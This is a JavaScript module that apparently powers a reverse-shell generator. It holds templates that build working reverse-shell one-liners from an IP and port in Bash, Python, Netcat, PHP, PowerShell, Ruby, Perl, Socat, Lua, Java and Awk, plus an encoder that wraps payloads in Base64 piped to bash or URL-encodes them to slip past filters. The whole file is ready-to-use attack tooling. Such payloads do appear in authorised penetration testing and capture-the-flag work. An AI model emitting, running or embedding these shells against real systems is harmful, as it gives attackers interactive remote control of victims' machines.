const shells = [
  {
    name: 'Bash',
    subtype: 'TCP',
    color: '#6EE7B7',
    template: (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
  },
  {
    name: 'Bash',
    subtype: 'UDP',
    color: '#6EE7B7',
    template: (ip, port) => `bash -i >& /dev/udp/${ip}/${port} 0>&1`,
  },
  {
    name: 'Bash',
    subtype: 'read line',
    color: '#6EE7B7',
    template: (ip, port) => `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`,
  },
  {
    name: 'Python3',
    subtype: null,
    color: '#A78BFA',
    template: (ip, port, shell) =>
      `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["${shell}","-i"])'`,
  },
  {
    name: 'Python3',
    subtype: 'short',
    color: '#A78BFA',
    template: (ip, port, shell) =>
      `python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("${shell}")'`,
  },
  {
    name: 'Netcat',
    subtype: '-e flag',
    color: '#FBBF24',
    template: (ip, port, shell) => `nc -e ${shell} ${ip} ${port}`,
  },
  {
    name: 'Netcat',
    subtype: 'mkfifo',
    color: '#FBBF24',
    template: (ip, port, shell) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`,
  },
  {
    name: 'Netcat',
    subtype: 'OpenBSD',
    color: '#FBBF24',
    template: (ip, port, shell) => `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc ${ip} ${port} >/tmp/f`,
  },
  {
    name: 'PHP',
    subtype: 'exec',
    color: '#FB7185',
    template: (ip, port, shell) => `php -r '$s=fsockopen("${ip}",${port});exec("${shell} -i <&3 >&3 2>&3");'`,
  },
  {
    name: 'PHP',
    subtype: 'proc_open',
    color: '#FB7185',
    template: (ip, port, shell) =>
      `php -r '$s=fsockopen("${ip}",${port});$p=proc_open("${shell}",array(0=>$s,1=>$s,2=>$s),$pipes);'`,
  },
  {
    name: 'PHP',
    subtype: 'popen',
    color: '#FB7185',
    template: (ip, port) =>
      `php -r '$s=fsockopen("${ip}",${port});while(!feof($s)){exec(fgets($s),$o);$o=implode("\\n",$o);$o.="\\n";fputs($s,$o);}'`,
  },
  {
    name: 'PowerShell',
    subtype: null,
    color: '#7DD3FC',
    template: (ip, port) =>
      `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"`,
  },
  {
    name: 'PowerShell',
    subtype: 'Base64',
    color: '#7DD3FC',
    template: (ip, port) => {
      const cmd = `$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$c.Close()`;
      return `powershell -e ${btoa(cmd)}`;
    },
  },
  {
    name: 'Ruby',
    subtype: null,
    color: '#F472B6',
    template: (ip, port, shell) =>
      `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");loop{c.gets.chomp!;(IO.popen(l,"r"){|io|c.print io.read}rescue c.print "failed: #{$!}\\n")}'`,
  },
  {
    name: 'Ruby',
    subtype: '-e',
    color: '#F472B6',
    template: (ip, port, shell) =>
      `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("${shell} -i <&%d >&%d 2>&%d",f,f,f)'`,
  },
  {
    name: 'Perl',
    subtype: null,
    color: '#6EE7B7',
    template: (ip, port, shell) =>
      `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("${shell} -i");};'`,
  },
  {
    name: 'Perl',
    subtype: 'no sh',
    color: '#6EE7B7',
    template: (ip, port) =>
      `perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"${ip}:${port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,
  },
  {
    name: 'Socat',
    subtype: null,
    color: '#9CA3AF',
    template: (ip, port) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`,
  },
  {
    name: 'Lua',
    subtype: null,
    color: '#FBBF24',
    template: (ip, port, shell) =>
      `lua -e "require('socket');require('os');t=socket.tcp();t:connect('${ip}','${port}');os.execute('${shell} -i <&3 >&3 2>&3');"`,
  },
  {
    name: 'Java',
    subtype: 'Runtime',
    color: '#FB7185',
    template: (ip, port, shell) =>
      `r = Runtime.getRuntime()\np = r.exec(["${shell}","-c","exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])\np.waitFor()`,
  },
  {
    name: 'xterm',
    subtype: null,
    color: '#A78BFA',
    template: (ip, port) => `xterm -display ${ip}:${port}`,
  },
  {
    name: 'Awk',
    subtype: null,
    color: '#6EE7B7',
    template: (ip, port, shell) =>
      `awk 'BEGIN {s = "/inet/tcp/0/${ip}/${port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,
  },
];

const osShells = {
  Linux: ['/bin/sh', '/bin/bash', '/bin/zsh'],
  Windows: ['cmd.exe', 'powershell.exe'],
  macOS: ['/bin/sh', '/bin/bash', '/bin/zsh'],
};

const encodings = ['None', 'Base64', 'URL', 'Double URL'];

function encodePayload(cmd, encoding) {
  switch (encoding) {
    case 'Base64': return `echo ${btoa(cmd)} | base64 -d | bash`;
    case 'URL': return encodeURIComponent(cmd);
    case 'Double URL': return encodeURIComponent(encodeURIComponent(cmd));
    default: return cmd;
  }
}

export { shells, osShells, encodings, encodePayload };
